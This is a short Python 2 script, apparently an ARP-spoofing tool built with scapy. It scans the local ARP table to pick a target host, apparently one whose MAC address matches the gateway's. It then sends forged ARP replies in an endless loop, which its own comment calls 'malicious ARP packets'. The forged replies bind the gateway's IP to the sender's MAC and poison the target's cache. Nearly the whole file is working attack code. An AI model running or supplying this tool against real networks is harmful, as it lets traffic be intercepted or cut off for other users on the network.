import subprocess
import re
import netifaces

import sys, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp
)

def scan():
    arp1 = subprocess.Popen(('arp','-n' ), stdout=subprocess.PIPE)
    #arp2 = subprocess.Popen(('ip','route' ), stdout=subprocess.PIPE)
    ipout1 = arp1.communicate()[0]
    #ipout2= arp2.communicate()[0]
    gws=netifaces.gateways()
    def_gateip = gws['default'][netifaces.AF_INET][0]
    #print def_gateip
    #print ipout1
    #print ipout2
    ipout=ipout1.split(" ")
    ipout = filter(None, ipout)
    #print ipout
    addrs=[]
    for i in range(7,len(ipout)):
        list1=[]
        try:
            #print ipout[i],ipout[i-2][6:]
            list1.append(ipout[i])
            list1.append(ipout[i-2][6:])
            i = i+4
        except:
            pass
        addrs.append(list1)
    #print addrs

    for i in addrs:
        if i[1]==def_gateip:
            gate_mac= i[0]

    for i in addrs:
        if i[0]==gate_mac:
            if i[1]!=def_gateip:
                print i[1]
                return i


def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
    # Function for sending the malicious ARP packets out with the specified data
    ether = Ether()
    ether.src = my_mac

    arp = ARP()
    arp.psrc = gateway_ip
    arp.hwsrc = my_mac

    arp = arp
    arp.pdst = target_ip
    arp.hwdst = target_mac

    ether = ether
    ether.src = my_mac

    ether.dst = target_mac

    arp.op = 2

    packet = ether / arp

    sendp(x=packet, verbose=False)

    #broadcastPacket()

def local_net():
    try :
        eth_ip= netifaces.ifaddresses('eth0')[netifaces.AF_INET]
        return False
    except:
        return True

if(local_net()):
    my_ip = netifaces.ifaddresses('wlan0')[netifaces.AF_INET]
    my_mac = netifaces.ifaddresses('wlan0')[netifaces.AF_LINK]
else:
    my_ip = netifaces.ifaddresses('eth0')[netifaces.AF_INET]
    my_mac = netifaces.ifaddresses('eth0')[netifaces.AF_LINK]

print type(my_ip[0]['addr']),my_mac[0]['addr']
gws=netifaces.gateways()
def_gateip = gws['default'][netifaces.AF_INET][0]
tar = scan()
print tar
if tar:
    print "sp"
    while True:
        sendPacket(str(my_mac[0]['addr']),str(def_gateip),str(tar[1]),str(tar[0]))
    print "sent"
else:
    print "no spoofing devices"